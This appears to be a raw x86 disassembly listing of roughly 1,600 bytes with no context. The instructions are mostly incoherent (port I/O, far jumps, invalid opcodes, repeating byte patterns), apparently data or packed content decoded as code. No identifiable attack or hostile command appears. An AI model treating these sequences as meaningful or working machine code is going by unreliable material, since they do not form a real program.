  41a512:	add    eax,0xf990ab41
  41a517:	add    DWORD PTR [ecx+0x21],edx
  41a51a:	in     al,dx
  41a51b:	sbb    ah,dl
  41a51d:	arpl   sp,bp
  41a51f:	mov    ebp,0x2c521cff
  41a524:	stos   DWORD PTR es:[edi],eax
  41a525:	lods   al,BYTE PTR ds:[esi]
  41a526:	add    eax,0xe6235124
  41a52b:	pop    ebx
  41a52c:	inc    ecx
  41a52d:	arpl   cx,ax
  41a52f:	pop    esi
  41a530:	dec    DWORD PTR [esi-0x64]
  41a533:	and    BYTE PTR [ecx],cl
  41a535:	and    edi,eax
  41a537:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a538:	push   ecx
  41a539:	and    DWORD PTR [eax+eax*4-0x70],eax
  41a53d:	push   0x65
  41a53f:	mov    ebx,0xd2c49ff
  41a544:	push   ebp
  41a545:	lods   al,BYTE PTR ds:[esi]
  41a546:	jmp    0xd3c9:0x52225f98
  41a54d:	bound  edx,QWORD PTR ds:0x40cc0005
  41a553:	inc    ecx
  41a554:	inc    eax
  41a555:	inc    ebx
  41a556:	bound  esp,QWORD PTR ds:0x41400043
  41a55c:	add    BYTE PTR [eax],al
  41a55e:	add    eax,0x43624062
  41a563:	inc    ecx
  41a564:	inc    eax
  41a565:	inc    eax
  41a566:	inc    eax
  41a567:	add    eax,0x40624340
  41a56c:	add    eax,0x40664140
  41a571:	sub    DWORD PTR [eax-0x73733a01],esp
  41a577:	and    eax,0x2216a034
  41a57c:	inc    edx
  41a57d:	or     eax,0x8b02c45a
  41a582:	inc    DWORD PTR [ebp-0x2]
  41a585:	retf   
  41a586:	mov    bh,0x54
  41a588:	fs push cs
  41a58a:	mov    eax,cs:0x40a08c44
  41a590:	cli    
  41a591:	into   
  41a592:	inc    ecx
  41a593:	dec    edx
  41a594:	sub    al,0x44
  41a596:	push   edx
  41a597:	mov    ch,0xe8
  41a599:	sbb    BYTE PTR [eax+0x44755020],ah
  41a59f:	push   edx
  41a5a0:	or     eax,0x40050043
  41a5a5:	js     0x41a5b7
  41a5a7:	inc    ecx
  41a5a8:	bound  eax,QWORD PTR [eax+0x40]
  41a5ab:	sldt   WORD PTR [eax-0x34]
  41a5af:	js     0x41a613
  41a5b1:	add    eax,0x40664143
  41a5b6:	inc    ebx
  41a5b7:	add    BYTE PTR [ecx+0x5],al
  41a5ba:	js     0x41a5fc
  41a5bc:	bound  eax,QWORD PTR [eax+0x0]
  41a5bf:	inc    eax
  41a5c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a5c1:	mov    ebp,0xac4cd523
  41a5c6:	mov    al,0x41
  41a5c8:	or     DWORD PTR [esi+0x56],ebp
  41a5cb:	adc    al,0x62
  41a5cd:	inc    edx
  41a5ce:	adc    eax,0xef52adc3
  41a5d3:	out    dx,al
  41a5d4:	imul   ecx,DWORD PTR [edx],0xffffffcb
  41a5d7:	aaa    
  41a5d8:	push   ds
  41a5d9:	loopne 0x41a62d
  41a5db:	inc    esp
  41a5dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5dd:	add    al,0x50
  41a5df:	stc    
  41a5e0:	retf   0xa92d
  41a5e3:	sub    al,0x39
  41a5e5:	leave  
  41a5e6:	inc    ecx
  41a5e7:	out    0xd0,al
  41a5e9:	dec    ebx
  41a5ea:	pop    edi
  41a5eb:	dec    esi
  41a5ec:	xor    ah,BYTE PTR [esi]
  41a5ee:	in     eax,dx
  41a5ef:	add    eax,0x35a22234
  41a5f4:	mov    WORD PTR [ecx+0x43],es
  41a5f7:	inc    eax
  41a5f8:	inc    eax
  41a5f9:	add    eax,0x434162
  41a5fe:	inc    eax
  41a5ff:	add    BYTE PTR [edx+0x5],ah
  41a602:	inc    eax
  41a603:	adc    BYTE PTR [edx+0x40],ah
  41a606:	inc    ebx
  41a607:	inc    ecx
  41a608:	add    eax,0x4340
  41a60d:	add    eax,0x404162
  41a612:	add    BYTE PTR [eax+0x43],al
  41a615:	inc    eax
  41a616:	add    eax,0x17419406
  41a61b:	outs   dx,BYTE PTR ds:[esi]
  41a61c:	cmp    DWORD PTR [ebp+0x416444da],ecx
  41a622:	fwait
  41a623:	dec    ebp
  41a624:	cs inc esp
  41a626:	mov    ecx,0x6ac046cb
  41a62b:	stos   DWORD PTR es:[edi],eax
  41a62c:	inc    edx
  41a62d:	sub    al,0x62
  41a62f:	es and al,0x40
  41a632:	add    BYTE PTR [eax],al
  41a634:	inc    ecx
  41a635:	inc    ebx
  41a636:	add    eax,0x41784062
  41a63b:	inc    eax
  41a63c:	inc    eax
  41a63d:	add    BYTE PTR [edi],cl
  41a63f:	bound  eax,QWORD PTR [ebx+0x0]
  41a642:	add    eax,0x25006240
  41a647:	inc    eax
  41a648:	add    eax,0x40254143
  41a64d:	add    eax,0x34620000
  41a652:	stos   BYTE PTR es:[edi],al
  41a653:	inc    ebp
  41a654:	mov    al,ds:0x61b4624c
  41a659:	clc    
  41a65a:	jae    0x41a5ff
  41a65c:	sub    eax,ebp
  41a65e:	cmp    al,0x35
  41a660:	test   al,0xe4
  41a662:	push   cs
  41a663:	inc    edx
  41a664:	push   ebp
  41a665:	and    DWORD PTR ds:0xc97012cb,ecx
  41a66b:	pusha  
  41a66c:	inc    ebx
  41a66d:	add    BYTE PTR [eax],al
  41a66f:	add    BYTE PTR [ecx+0x40],al
  41a672:	bound  esp,QWORD PTR [esi+0x0]
  41a675:	inc    eax
  41a676:	add    eax,0x5400000
  41a67b:	inc    ecx
  41a67c:	inc    eax
  41a67d:	inc    eax
  41a67e:	bound  esp,QWORD PTR ds:0x25050043
  41a684:	inc    ecx
  41a685:	inc    ebx
  41a686:	inc    eax
  41a687:	test   BYTE PTR [eax+0x0],al
  41a68a:	bound  ebx,QWORD PTR [eax+0x62]
  41a68d:	inc    ecx
  41a68e:	inc    eax
  41a68f:	jae    0x41a68f
  41a691:	jns    0x41a64b
  41a693:	mov    al,0xf7
  41a695:	inc    eax
  41a696:	pop    ss
  41a697:	inc    ebp
  41a698:	inc    esp
  41a699:	mov    esp,0x4026414a
  41a69e:	xor    esp,DWORD PTR [ecx]
  41a6a0:	sub    al,0xd
  41a6a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a6a3:	test   al,0xfa
  41a6a5:	inc    eax
  41a6a6:	inc    edx
  41a6a7:	push   eax
  41a6a8:	dec    edx
  41a6a9:	imul   ecx,eax,0x24
  41a6ac:	loop   0x41a6b2
  41a6ae:	stos   DWORD PTR es:[edi],eax
  41a6af:	mov    eax,ds:0x763a4d5
  41a6b4:	ss inc eax
  41a6b6:	inc    esp
  41a6b7:	adc    cl,BYTE PTR gs:0x40cfe8b8
  41a6be:	loopne 0x41a6d0
  41a6c0:	bound  eax,QWORD PTR [eax+0x41]
  41a6c3:	and    eax,0x40000500
  41a6c8:	inc    ebx
  41a6c9:	add    eax,0x40624041
  41a6ce:	inc    ebx
  41a6cf:	add    eax,0x43402541
  41a6d4:	bound  eax,QWORD PTR [eax+0x43]
  41a6d7:	int3   
  41a6d8:	inc    eax
  41a6d9:	bound  eax,QWORD PTR [eax]
  41a6db:	inc    ecx
  41a6dc:	inc    eax
  41a6dd:	inc    eax
  41a6de:	add    eax,0x44fe2205
  41a6e3:	cmp    esi,DWORD PTR [ebx+0x66]
  41a6e6:	inc    eax
  41a6e7:	daa    
  41a6e8:	xor    eax,0x34d16944
  41a6ed:	loopne 0x41a6fb
  41a6ef:	inc    edx
  41a6f0:	jg     0x41a71e
  41a6f2:	lock mov es,WORD PTR es:0x48a22140
  41a6fa:	inc    edx
  41a6fb:	inc    edx
  41a6fc:	div    BYTE PTR [esi+0x12]
  41a6ff:	inc    edx
  41a700:	std    
  41a701:	int    0xc8
  41a703:	or     ah,BYTE PTR [ebx-0x16]
  41a706:	inc    eax
  41a707:	loopne 0x41a72a
  41a709:	sbb    edx,esp
  41a70b:	add    al,0x49
  41a70d:	bound  eax,QWORD PTR [eax+0x25]
  41a710:	add    BYTE PTR [esi+0x40],ah
  41a713:	add    eax,0x40404143
  41a718:	inc    ebx
  41a719:	add    BYTE PTR [eax],al
  41a71b:	add    BYTE PTR [edx-0x34],ah
  41a71e:	inc    eax
  41a71f:	add    eax,0x40004041
  41a724:	inc    ecx
  41a725:	int3   
  41a726:	add    BYTE PTR [ebx-0x7c],al
  41a729:	add    eax,0x5406240
  41a72e:	(bad)  
  41a72f:	clc    
  41a730:	adc    eax,0xc4fe4f34
  41a735:	retf   
  41a736:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a737:	inc    eax
  41a738:	inc    eax
  41a739:	in     al,0xa7
  41a73b:	inc    esp
  41a73c:	dec    edi
  41a73d:	es ds inc eax
  41a740:	outs   dx,BYTE PTR ds:[esi]
  41a741:	mov    ds:0xb4a42c17,al
  41a746:	bound  eax,QWORD PTR [eax+eax*2+0x2d]
  41a74a:	and    al,BYTE PTR [esi+0x41]
  41a74d:	adc    eax,0x2a0e3579
  41a752:	xor    ah,dh
  41a754:	jo     0x41a79b
  41a756:	arpl   WORD PTR [ecx-0x62a0b8c0],bp
  41a75c:	in     al,dx
  41a75d:	aaa    
  41a75e:	or     BYTE PTR [eax+0x62],al
  41a761:	pop    eax
  41a762:	inc    ecx
  41a763:	add    eax,0x40404340
  41a768:	inc    ebx
  41a769:	inc    eax
  41a76a:	test   BYTE PTR [eax],al
  41a76c:	add    eax,0x40624041
  41a771:	inc    eax
  41a772:	add    BYTE PTR [edx+0x5],ah
  41a775:	inc    ebx
  41a776:	add    BYTE PTR [eax+0x78],al
  41a779:	inc    ecx
  41a77a:	add    BYTE PTR [eax+0x41],bl
  41a77d:	bound  edi,QWORD PTR [edi+ecx*1+0x6293e1a2]
  41a784:	shl    BYTE PTR ds:0x48304044,0x2c
  41a78b:	retf   
  41a78c:	bound  eax,QWORD PTR [eax-0x5eb7f637]
  41a792:	inc    esp
  41a793:	fs jb  0x41a75b
  41a796:	push   eax
  41a797:	inc    eax
  41a798:	fs push ebp
  41a79a:	aad    0x35
  41a79c:	cmp    al,0x91
  41a79e:	bound  edx,QWORD PTR [esi+ebp*2]
  41a7a1:	popa   
  41a7a2:	or     DWORD PTR [ebx-0x70],esp
  41a7a5:	inc    edx
  41a7a6:	jl     0x41a7e8
  41a7a8:	inc    eax
  41a7a9:	jns    0x41a7a9
  41a7ab:	fs jnp 0x41a7e7
  41a7ae:	sub    al,0x3
  41a7b0:	popa   
  41a7b1:	inc    eax
  41a7b2:	test   BYTE PTR [eax],al
  41a7b4:	int3   
  41a7b5:	bound  eax,QWORD PTR ds:0xcc840f41
  41a7bb:	inc    ebx
  41a7bc:	add    BYTE PTR [eax+0x0],al
  41a7bf:	inc    eax
  41a7c0:	inc    eax
  41a7c1:	inc    eax
  41a7c2:	int3   
  41a7c3:	add    BYTE PTR ds:0x62404341,al
  41a7c9:	pop    eax
  41a7ca:	add    BYTE PTR [ebx+0x40],al
  41a7cd:	bound  ecx,QWORD PTR [edi]
  41a7cf:	inc    eax
  41a7d0:	bound  eax,QWORD PTR [ecx+0x4e2842d8]
  41a7d6:	inc    eax
  41a7d7:	inc    ebp
  41a7d8:	das    
  41a7d9:	cmp    dh,dh
  41a7db:	add    DWORD PTR [edx+0x35],esp
  41a7de:	adc    eax,0xc4420d20
  41a7e3:	add    al,0x30
  41a7e5:	inc    eax
  41a7e6:	inc    eax
  41a7e7:	outs   dx,DWORD PTR ds:[esi]
  41a7e8:	popa   
  41a7e9:	jp     0x41a83a
  41a7eb:	test   DWORD PTR [edx+0x58],0x9d7e1612
  41a7f2:	inc    eax
  41a7f3:	dec    edi
  41a7f4:	sar    DWORD PTR ds:0xfd6e7e40,1
  41a7fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7fb:	inc    esi
  41a7fc:	adc    eax,ebx
  41a7fe:	adc    al,0x60
  41a800:	jecxz  0x41a82a
  41a802:	cmp    eax,0x404c4a5a
  41a807:	jp     0x41a809
  41a809:	add    BYTE PTR [eax+0x40],al
  41a80c:	cmovno eax,DWORD PTR ds:0x40056243
  41a813:	int3   
  41a814:	add    ah,cl
  41a816:	inc    eax
  41a817:	inc    eax
  41a818:	bound  eax,QWORD PTR [ecx+0x0]
  41a81b:	add    BYTE PTR [edi],cl
  41a81d:	inc    ebx
  41a81e:	inc    eax
  41a81f:	inc    eax
  41a820:	add    BYTE PTR [ecx+0x43],al
  41a823:	add    eax,0x40256240
  41a828:	bound  eax,QWORD PTR [eax]
  41a82a:	xor    DWORD PTR [eax-0x3d],eax
  41a82d:	cmp    cl,dh
  41a82f:	xor    al,0x13
  41a831:	push   edi
  41a832:	inc    edi
  41a833:	lds    esp,FWORD PTR [edx+edx*8+0x2040407e]
  41a83a:	jecxz  0x41a80a
  41a83c:	inc    ebp
  41a83d:	xor    al,0x44
  41a83f:	push   esp
  41a840:	push   cs
  41a841:	xor    al,0x54
  41a843:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a844:	inc    ebp
  41a845:	pop    esi
  41a846:	bound  edi,QWORD PTR ds:0x64e14540
  41a84c:	nop
  41a84d:	ret    0xc311
  41a850:	or     eax,esp
  41a852:	dec    edi
  41a853:	inc    esp
  41a854:	addr16 and al,0xa8
  41a857:	push   edx
  41a858:	inc    eax
  41a859:	sub    BYTE PTR ds:0x4140cc00,al
  41a85f:	inc    eax
  41a860:	inc    ebx
  41a861:	bound  esp,QWORD PTR ds:0x41400043
  41a867:	add    BYTE PTR [eax],al
  41a869:	add    eax,0x43624062
  41a86e:	inc    ecx
  41a86f:	inc    eax
  41a870:	inc    eax
  41a871:	inc    eax
  41a872:	add    eax,0x40624340
  41a877:	add    eax,0x40664140
  41a87c:	pusha  
  41a87d:	sub    al,0x43
  41a87f:	push   ss
  41a880:	or     eax,0x600d1f4a
  41a885:	mov    esi,0x1ccb432c
  41a88a:	inc    eax
  41a88b:	in     eax,dx
  41a88c:	push   ds
  41a88d:	fs pop ecx
  41a88f:	mov    DWORD PTR [ecx-0x30],eax
  41a892:	inc    ebx
  41a893:	add    BYTE PTR ds:0x41107840,al
  41a899:	bound  eax,QWORD PTR [eax+0x40]
  41a89c:	sldt   WORD PTR [eax-0x34]
  41a8a0:	js     0x41a904
  41a8a2:	add    eax,0x40664143
  41a8a7:	inc    ebx
  41a8a8:	add    BYTE PTR [ecx+0x5],al
  41a8ab:	js     0x41a8ed
  41a8ad:	bound  eax,QWORD PTR [eax+0x0]
  41a8b0:	inc    eax
  41a8b1:	adc    al,0x75
  41a8b3:	push   es
  41a8b4:	lea    ebp,[eax+0x40587b75]
  41a8ba:	and    DWORD PTR [eax],esp
  41a8bc:	inc    esp
  41a8bd:	out    0x30,al
  41a8bf:	dec    esp
  41a8c0:	dec    ebx
  41a8c1:	adc    bl,ch
  41a8c3:	je     0x41a8f1
  41a8c5:	inc    esi
  41a8c6:	inc    ebx
  41a8c7:	arpl   cx,dx
  41a8c9:	inc    eax
  41a8ca:	push   0x8962bc7c
  41a8cf:	dec    esp
  41a8d0:	push   0x19
  41a8d2:	popa   
  41a8d3:	mov    ds:0xe47040d0,al
  41a8d8:	or     DWORD PTR [eax+0x52],eax
  41a8db:	ins    DWORD PTR es:[edi],dx
  41a8dc:	lea    esi,[ecx+0x24]
  41a8df:	inc    ebp
  41a8e0:	pusha  
  41a8e1:	adc    ah,BYTE PTR [ecx+0x4f]
  41a8e4:	inc    esp
  41a8e5:	adc    DWORD PTR [ebx+eiz*2-0x1f1dbf9e],ebx
  41a8ec:	inc    ecx
  41a8ed:	inc    ebx
  41a8ee:	inc    eax
  41a8ef:	inc    eax
  41a8f0:	add    eax,0x434162
  41a8f5:	inc    eax
  41a8f6:	add    BYTE PTR [edx+0x5],ah
  41a8f9:	inc    eax
  41a8fa:	adc    BYTE PTR [edx+0x40],ah
  41a8fd:	inc    ebx
  41a8fe:	inc    ecx
  41a8ff:	add    eax,0x4340
  41a904:	add    eax,0x404162
  41a909:	add    BYTE PTR [eax+0x43],al
  41a90c:	inc    eax
  41a90d:	add    eax,0x73a8622c
  41a912:	lods   al,BYTE PTR ds:[esi]
  41a913:	add    esp,DWORD PTR [eax+0x1196ba13]
  41a919:	or     al,0xc1
  41a91b:	inc    eax
  41a91c:	das    
  41a91d:	in     eax,dx
  41a91e:	lds    ebx,FWORD PTR [ebx-0x4c]
  41a921:	sub    DWORD PTR fs:0xd5672075,eax
  41a928:	inc    edx
  41a929:	cmp    eax,0x6022403e
  41a92e:	inc    eax
  41a92f:	add    BYTE PTR [eax],al
  41a931:	inc    ecx
  41a932:	inc    ebx
  41a933:	add    eax,0x41784062
  41a938:	inc    eax
  41a939:	inc    eax
  41a93a:	add    BYTE PTR [edi],cl
  41a93c:	bound  eax,QWORD PTR [ebx+0x0]
  41a93f:	add    eax,0x25006240
  41a944:	inc    eax
  41a945:	add    eax,0x40254143
  41a94a:	add    eax,0x7e620000
  41a94f:	nop
  41a950:	push   esp
  41a951:	inc    eax
  41a952:	(bad)  
  41a954:	ins    DWORD PTR es:[edi],dx
  41a955:	jmp    0x4098:0x64604f64
  41a95c:	data16 jb 0x41a9a8
  41a95f:	shl    DWORD PTR [edi-0x3c],0x4d
  41a963:	inc    eax
  41a964:	bound  esp,QWORD PTR [ecx+0x2c]
  41a967:	inc    ebx
  41a968:	add    BYTE PTR [eax],al
  41a96a:	add    BYTE PTR [ecx+0x40],al
  41a96d:	bound  esp,QWORD PTR [esi+0x0]
  41a970:	inc    eax
  41a971:	add    eax,0x5400000
  41a976:	inc    ecx
  41a977:	inc    eax
  41a978:	inc    eax
  41a979:	bound  esp,QWORD PTR ds:0x25050043
  41a97f:	inc    ecx
  41a980:	inc    ebx
  41a981:	inc    eax
  41a982:	test   BYTE PTR [eax+0x0],al
  41a985:	bound  ebx,QWORD PTR [eax+0x62]
  41a988:	inc    ecx
  41a989:	inc    eax
  41a98a:	dec    edx
  41a98b:	lods   al,BYTE PTR ds:[esi]
  41a98c:	dec    edi
  41a98d:	pop    esp
  41a98e:	inc    eax
  41a98f:	xor    al,0x4
  41a991:	mov    eax,0x67600ad0
  41a996:	inc    eax
  41a997:	stos   BYTE PTR es:[edi],al
  41a998:	mov    ds:0xa2cd75d5,eax
  41a99d:	push   ds
  41a99e:	inc    eax
  41a99f:	inc    ebx
  41a9a0:	inc    edx
  41a9a1:	pop    esp
  41a9a2:	test   al,0x64
  41a9a4:	push   cs
  41a9a5:	mov    ah,0xc
  41a9a7:	popa   
  41a9a8:	mov    ds:0x904312fe,al
  41a9ad:	inc    ecx
  41a9ae:	inc    eax
  41a9af:	inc    esp
  41a9b0:	sub    DWORD PTR [ecx-0x48],ecx
  41a9b3:	adc    BYTE PTR [ebx-0x72],0xd
  41a9b7:	loope  0x41a995
  41a9b9:	sub    al,0x41
  41a9bb:	jae    0x41a9cd
  41a9bd:	bound  eax,QWORD PTR [eax+0x41]
  41a9c0:	and    eax,0x40000500
  41a9c5:	inc    ebx
  41a9c6:	add    eax,0x40624041
  41a9cb:	inc    ebx
  41a9cc:	add    eax,0x43402541
  41a9d1:	bound  eax,QWORD PTR [eax+0x43]
  41a9d4:	int3   
  41a9d5:	inc    eax
  41a9d6:	bound  eax,QWORD PTR [eax]
  41a9d8:	inc    ecx
  41a9d9:	inc    eax
  41a9da:	inc    eax
  41a9db:	add    eax,0x40748805
  41a9e0:	inc    esp
  41a9e1:	data16 mov dh,0xe6
  41a9e4:	repz test al,0xb8
  41a9e7:	adc    al,0x20
  41a9e9:	and    ecx,ebp
  41a9eb:	cmp    al,0x36
  41a9ed:	adc    BYTE PTR [esi+0x40],bh
  41a9f0:	and    DWORD PTR [esi+0x9],ebx
  41a9f3:	dec    esi
  41a9f4:	pop    ecx
  41a9f5:	bound  eax,QWORD PTR [eax+0x25]
  41a9f8:	add    BYTE PTR [esi+0x40],ah
  41a9fb:	add    eax,0x40404143
  41aa00:	inc    ebx
  41aa01:	add    BYTE PTR [eax],al
  41aa03:	add    BYTE PTR [edx-0x34],ah
  41aa06:	inc    eax
  41aa07:	add    eax,0x40004041
  41aa0c:	inc    ecx
  41aa0d:	int3   
  41aa0e:	add    BYTE PTR [ebx-0x7c],al
  41aa11:	add    eax,0x5406240
  41aa16:	bound  ebp,QWORD PTR [eax+0x62d50826]
  41aa1c:	(bad)  
  41aa1d:	cmp    dh,bh
  41aa1f:	inc    ecx
  41aa20:	inc    ebx
  41aa21:	inc    eax
  41aa22:	daa    
  41aa23:	pusha  
  41aa24:	dec    ecx
  41aa25:	ficom  DWORD PTR [edx-0xf]
  41aa28:	hlt    
  41aa29:	outs   dx,BYTE PTR ds:[esi]
  41aa2a:	jg     0x41a9d6
  41aa2c:	sub    al,0x20
  41aa2e:	imul   DWORD PTR [esi*2-0x4b889ec0]
  41aa35:	lds    edx,FWORD PTR [ebx+eiz*2]
  41aa38:	inc    esp
  41aa39:	push   cs
  41aa3a:	inc    eax
  41aa3b:	bound  ebx,QWORD PTR [eax+0x41]
  41aa3e:	add    eax,0x40404340
  41aa43:	inc    ebx
  41aa44:	inc    eax
  41aa45:	test   BYTE PTR [eax],al
  41aa47:	add    eax,0x40624041
  41aa4c:	inc    eax
  41aa4d:	add    BYTE PTR [edx+0x5],ah
  41aa50:	inc    ebx
  41aa51:	add    BYTE PTR [eax+0x78],al
  41aa54:	inc    ecx
  41aa55:	add    BYTE PTR [eax+0x41],bl
  41aa58:	bound  ecx,QWORD PTR [ebx-0x5f]
  41aa5b:	out    0x4f,al
  41aa5d:	arpl   WORD PTR [edx-0x58],cx
  41aa60:	inc    eax
  41aa61:	mov    eax,ds:0x6354bd43
  41aa66:	dec    esp
  41aa67:	adc    cl,BYTE PTR [edi]
  41aa69:	jle    0x41aa0c
  41aa6b:	dec    esp
  41aa6c:	or     eax,0x404115dc
  41aa71:	and    eax,0x637b444f
  41aa76:	lds    eax,FWORD PTR [ebp+0x9]
  41aa79:	scas   eax,DWORD PTR es:[edi]
  41aa7a:	and    DWORD PTR [ebp-0x44],ebp
  41aa7d:	in     eax,0x27
  41aa7f:	and    BYTE PTR [eax+0x44],al
  41aa82:	rcl    BYTE PTR [ebx+0xd],cl
  41aa85:	pop    esi
  41aa86:	push   edx
  41aa87:	xor    eax,0xf3612014
  41aa8c:	inc    esp
  41aa8d:	and    ebp,esp
  41aa8f:	inc    eax
  41aa90:	test   BYTE PTR [eax],al
  41aa92:	int3   
  41aa93:	bound  eax,QWORD PTR ds:0xcc840f41
  41aa99:	inc    ebx
  41aa9a:	add    BYTE PTR [eax+0x0],al
  41aa9d:	inc    eax
  41aa9e:	inc    eax
  41aa9f:	inc    eax
  41aaa0:	int3   
  41aaa1:	add    BYTE PTR ds:0x62404341,al
  41aaa7:	pop    eax
  41aaa8:	add    BYTE PTR [ebx+0x40],al
  41aaab:	bound  ecx,QWORD PTR [edi]
  41aaad:	inc    eax
  41aaae:	leave  
  41aaaf:	inc    eax
  41aab0:	and    esp,DWORD PTR [esi]
  41aab2:	out    0xd6,al
  41aab4:	pop    eax
  41aab5:	inc    ebx
  41aab6:	stc    
  41aab7:	add    eax,DWORD PTR [eax-0x1e]
  41aaba:	cmp    eax,0x62a524b8
  41aabf:	inc    eax
  41aac0:	and    BYTE PTR [edx],ah
  41aac2:	in     al,0x63
  41aac4:	xchg   ebp,eax
  41aac5:	ins    BYTE PTR es:[edi],dx
  41aac6:	dec    ebp
  41aac7:	adc    eax,0x6920592c
  41aacc:	pop    esi
  41aacd:	call   0xa17ceb1a
  41aad2:	aad    0x5c
  41aad4:	shr    eax,0x69
  41aad7:	adc    ah,BYTE PTR [eax]
  41aad9:	inc    eax
  41aada:	int    0x62
  41aadc:	jnp    0x41aade
  41aade:	add    BYTE PTR [eax+0x40],al
  41aae1:	cmovno eax,DWORD PTR ds:0x40056243
  41aae8:	int3   
  41aae9:	add    ah,cl
  41aaeb:	inc    eax
  41aaec:	inc    eax
  41aaed:	bound  eax,QWORD PTR [ecx+0x0]
  41aaf0:	add    BYTE PTR [edi],cl
  41aaf2:	inc    ebx
  41aaf3:	inc    eax
  41aaf4:	inc    eax
  41aaf5:	add    BYTE PTR [ecx+0x43],al
  41aaf8:	add    eax,0x40256240
  41aafd:	bound  eax,QWORD PTR [eax]
  41aaff:	pop    edi
  41ab00:	pop    eax
  41ab01:	inc    eax
  41ab02:	adc    al,0xe2
  41ab04:	xor    DWORD PTR ds:0x14e8e6c0,0x31
  41ab0b:	mov    ebx,0x26654012
  41ab10:	cmp    al,BYTE PTR [eax-0x1f]
  41ab13:	and    esp,DWORD PTR [edx-0x50]
  41ab16:	std    
  41ab17:	enter  0x1392,0x32
  41ab1b:	adc    eax,DWORD PTR ds:0x4140cc00
  41ab21:	inc    eax
  41ab22:	inc    ebx
  41ab23:	bound  esp,QWORD PTR ds:0x41400043
  41ab29:	add    BYTE PTR [eax],al
  41ab2b:	add    eax,0x43624062
  41ab30:	inc    ecx
  41ab31:	inc    eax
  41ab32:	inc    eax
  41ab33:	inc    eax
  41ab34:	add    eax,0x40624340
  41ab39:	add    eax,0x40664140
  41ab3e:	mov    ebp,0x4d62c00d
  41ab43:	inc    eax
  41ab44:	ss popa 
  41ab46:	mov    dl,0xd7
  41ab48:	inc    ebx
  41ab49:	sbb    eax,0x78eb0e4a
  41ab4e:	pop    ss
  41ab4f:	mov    ah,0x50
  41ab51:	clc    
  41ab52:	imul   eax,DWORD PTR [eax+0x7a],0x22
  41ab56:	push   esi
  41ab57:	add    eax,0x923625c
  41ab5c:	enter  0x5530,0x43
  41ab60:	dec    ebp
  41ab61:	jmp    0xe464eb9a
  41ab66:	mov    ebp,0xd98fdbc
  41ab6b:	pop    ds
  41ab6c:	jne    0x41ab8f
  41ab6e:	mov    al,0x41
  41ab70:	addr16 retfw 
  41ab73:	inc    eax
  41ab74:	and    DWORD PTR [ebp+0x5f],esp
  41ab77:	fadd   DWORD PTR [edi+ebx*1]
  41ab7a:	inc    eax
  41ab7b:	adc    al,0x43
  41ab7d:	add    BYTE PTR ds:0x41107840,al
  41ab83:	bound  eax,QWORD PTR [eax+0x40]
  41ab86:	sldt   WORD PTR [eax-0x34]
  41ab8a:	js     0x41abee
  41ab8c:	add    eax,0x40664143
  41ab91:	inc    ebx
  41ab92:	add    BYTE PTR [ecx+0x5],al
  41ab95:	js     0x41abd7
  41ab97:	bound  eax,QWORD PTR [eax+0x0]
  41ab9a:	inc    eax
  41ab9b:	gs and esi,ebp
  41ab9e:	test   BYTE PTR [eax],dh
  41aba0:	sub    al,0xd2
  41aba2:	inc    eax
  41aba3:	mov    eax,ds:0x53633d7b
  41aba8:	bound  ebp,QWORD PTR [ecx+0x10]
  41abab:	dec    edi
  41abac:	and    DWORD PTR [esp+esi*4+0x5],eax
  41abb0:	inc    ebx
  41abb1:	and    DWORD PTR [eax-0x60],eax
  41abb4:	push   edx
  41abb5:	sub    eax,0x4da40415
  41abba:	sbb    DWORD PTR [ebx],esi
  41abbc:	hlt    
  41abbd:	inc    ecx
  41abbe:	inc    ebx
  41abbf:	inc    eax
  41abc0:	inc    eax
  41abc1:	add    eax,0x434162
  41abc6:	inc    eax
  41abc7:	add    BYTE PTR [edx+0x5],ah
  41abca:	inc    eax
  41abcb:	adc    BYTE PTR [edx+0x40],ah
  41abce:	inc    ebx
  41abcf:	inc    ecx
  41abd0:	add    eax,0x4340
  41abd5:	add    eax,0x404162
  41abda:	add    BYTE PTR [eax+0x43],al
  41abdd:	inc    eax
  41abde:	add    eax,0x69e143ae
  41abe3:	dec    ecx
  41abe4:	inc    eax
  41abe5:	enter  0xd52f,0x98
  41abe9:	push   esp
  41abea:	inc    eax
  41abeb:	adc    ch,BYTE PTR [bx+di]
  41abee:	es inc ecx
  41abf0:	inc    ecx
  41abf1:	xchg   esi,eax
  41abf2:	inc    eax
  41abf3:	mov    eax,0xee444440
  41abf8:	push   edi
  41abf9:	rol    BYTE PTR [eax+0x10],1
  41abfc:	add    esp,DWORD PTR [ecx-0x60]
  41abff:	inc    esp
  41ac00:	in     al,dx
  41ac01:	iret   
  41ac02:	sahf   
  41ac03:	inc    eax
  41ac04:	add    BYTE PTR [eax],al
  41ac06:	inc    ecx
  41ac07:	inc    ebx
  41ac08:	add    eax,0x41784062
  41ac0d:	inc    eax
  41ac0e:	inc    eax
  41ac0f:	add    BYTE PTR [edi],cl
  41ac11:	bound  eax,QWORD PTR [ebx+0x0]
  41ac14:	add    eax,0x25006240
  41ac19:	inc    eax
  41ac1a:	add    eax,0x40254143
  41ac1f:	add    eax,0xc620000
  41ac24:	inc    eax
  41ac25:	cmp    esp,DWORD PTR [eax+0x2c]
  41ac28:	addr16 (bad) 
  41ac2a:	(bad)  
  41ac2b:	leave  
  41ac2c:	add    eax,0x59accec9
  41ac31:	(bad)  
  41ac32:	dec    edi
  41ac33:	es inc eax
  41ac35:	call   0xab777a1c
  41ac3a:	inc    ebx
  41ac3b:	mov    eax,0x47013a04
  41ac40:	mov    ah,0xee
  41ac42:	pop    es
  41ac43:	add    eax,0xee554840
  41ac48:	or     eax,0x40cb28fb
  41ac4d:	popa   
  41ac4e:	popa   
  41ac4f:	inc    esp
  41ac50:	jnp    0x41ac91
  41ac52:	adc    eax,0x7fc140ac
  41ac57:	sub    al,0x43
  41ac59:	add    BYTE PTR [eax],al
  41ac5b:	add    BYTE PTR [ecx+0x40],al
  41ac5e:	bound  esp,QWORD PTR [esi+0x0]
  41ac61:	inc    eax
  41ac62:	add    eax,0x5400000
  41ac67:	inc    ecx
  41ac68:	inc    eax
  41ac69:	inc    eax
  41ac6a:	bound  esp,QWORD PTR ds:0x25050043
  41ac70:	inc    ecx
  41ac71:	inc    ebx
  41ac72:	inc    eax
